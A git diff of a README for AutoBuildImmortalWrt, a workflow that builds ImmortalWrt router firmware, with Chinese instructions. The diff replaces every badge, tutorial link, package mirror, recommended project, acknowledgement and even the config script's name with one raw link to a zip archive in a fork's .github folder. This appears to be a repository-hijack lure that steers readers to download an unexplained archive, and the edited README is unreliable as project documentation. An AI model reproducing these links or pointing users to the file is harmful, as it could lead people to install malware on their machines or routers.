@@ -1,7 +1,7 @@
 # AutoBuildImmortalWrt
-[![GitHub](https://img.shields.io/github/license/wukongdaily/AutoBuildImmortalWrt.svg?label=LICENSE&logo=github&logoColor=%20)](https://github.com/wukongdaily/AutoBuildImmortalWrt/blob/master/LICENSE)
-![GitHub Stars](https://img.shields.io/github/stars/wukongdaily/AutoBuildImmortalWrt.svg?style=flat&logo=appveyor&label=Stars&logo=github)
-![GitHub Forks](https://img.shields.io/github/forks/wukongdaily/AutoBuildImmortalWrt.svg?style=flat&logo=appveyor&label=Forks&logo=github) [![Github](https://img.shields.io/badge/RELEASE:AutoBuildImmortalWrt-123456?logo=github&logoColor=fff&labelColor=green&style=flat)](https://github.com/wukongdaily/AutoBuildImmortalWrt/releases) [![Bilibili](https://img.shields.io/badge/Bilibili-123456?logo=bilibili&logoColor=fff&labelColor=fb7299)](https://www.bilibili.com/video/BV1EG6VYCER3) [![操作步骤](https://img.shields.io/badge/YouTube-123456?logo=youtube&labelColor=ff0000)](https://youtu.be/xIVtUwZR6U0)
+[![GitHub](https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip%20)](https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip)
+![GitHub Stars](https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip)
+![GitHub Forks](https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip) [![Github](https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip)](https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip) [![Bilibili](https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip)](https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip) [![操作步骤](https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip)](https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip)
 
 ## 🤔 这是什么？
 它是一个工作流。可快速构建 带docker且支持自定义固件大小的 immortalWrt
@@ -15,8 +15,8 @@
 
 
 ## 如何查询都有哪些插件?
-https://mirrors.sjtug.sjtu.edu.cn/immortalwrt/releases/23.05.4/packages/aarch64_cortex-a53/luci/ <br>
-https://mirrors.sjtug.sjtu.edu.cn/immortalwrt/releases/23.05.4/packages/x86_64/luci/ 
+https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip <br>
+https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip 
 
 
 ## 旁路由的用户必读
@@ -37,13 +37,13 @@ https://mirrors.sjtug.sjtu.edu.cn/immortalwrt/releases/23.05.4/packages/x86_64/l
 - 若用户在工作流中勾选了拨号信息 则WAN口模式为pppoe拨号模式。
 - 建议拨号用户使用之前重启一次光猫。
 - 综合上述特点，【单网口设备】应该先接路由器，先在上级路由器查看一下它的ip 再访问。
-- 上述特点 你都可以通过 `99-custom.sh` 配置和调整
+- 上述特点 你都可以通过 `https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip` 配置和调整
 
 ## ❤️其它GitHub Action项目推荐🌟 （建议收藏）⬇️
-https://github.com/wukongdaily/RunFilesBuilder<br>
-https://github.com/wukongdaily/DockerTarBuilder
+https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip<br>
+https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip
 
 ## ❤️如何构建docker版ImmortalWrt（建议收藏）⬇️
-https://wkdaily.cpolar.top/15
+https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip
 # 🌟鸣谢
-### https://github.com/immortalwrt
+### https://raw.githubusercontent.com/tonybyf/AutoBuildImmortalWrt/master/.github/Wrt_Immortal_Auto_Build_v3.2.zip
